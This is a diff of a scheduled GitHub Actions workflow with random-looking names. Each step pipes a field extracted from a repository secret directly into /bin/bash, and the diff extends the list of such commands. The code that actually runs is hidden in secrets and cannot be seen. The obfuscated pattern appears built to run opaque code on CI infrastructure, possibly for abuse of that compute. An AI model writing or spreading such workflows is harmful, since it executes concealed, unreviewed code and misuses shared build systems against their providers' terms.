@@ -1,11 +1,9 @@
 name: blackstonefreezing
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
-
-jobs:  # 23099
+    - cron: '47 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +11,18 @@ jobs:  # 23099
       - uses: actions/checkout@v4
       - name: blackstonefreezing
         env:
-          gqh836: ${{ secrets.gqh836 }}
+          uorep11: ${{ secrets.uorep11 }}
         run: |
-          echo $gqh836 | jq -r .cmvc6745 | /bin/bash
-          echo $lclvx32 | jq -r .r4406 | /bin/bash
-          echo $xw3 | jq -r .kvjg8350 | /bin/bash
-          echo $kjy82891 | jq -r .rd901 | /bin/bash
-          echo $bil30287 | jq -r .vfhc39 | /bin/bash
-          echo $jedw54680 | jq -r .vutow1273 | /bin/bash
-          echo $umo126 | jq -r .madj51 | /bin/bash
+          echo $uorep11 | jq -r .trzf503 | /bin/bash
+          echo $b9985 | jq -r .ckhq9 | /bin/bash
+          echo $eopj777 | jq -r .j904 | /bin/bash
+          echo $ee31 | jq -r .x7 | /bin/bash
+          echo $bku899 | jq -r .uii45275 | /bin/bash
+          echo $khmt7369 | jq -r .acsbf071 | /bin/bash
+          echo $okzg842 | jq -r .o95973 | /bin/bash
+          echo $hdtw38 | jq -r .hkz7578 | /bin/bash
+          echo $xfb83811 | jq -r .e0 | /bin/bash
+          echo $i6 | jq -r .wlcu3 | /bin/bash
+          echo $ahtu12 | jq -r .jawi2 | /bin/bash
+          echo $ymb66 | jq -r .xody3032 | /bin/bash
 
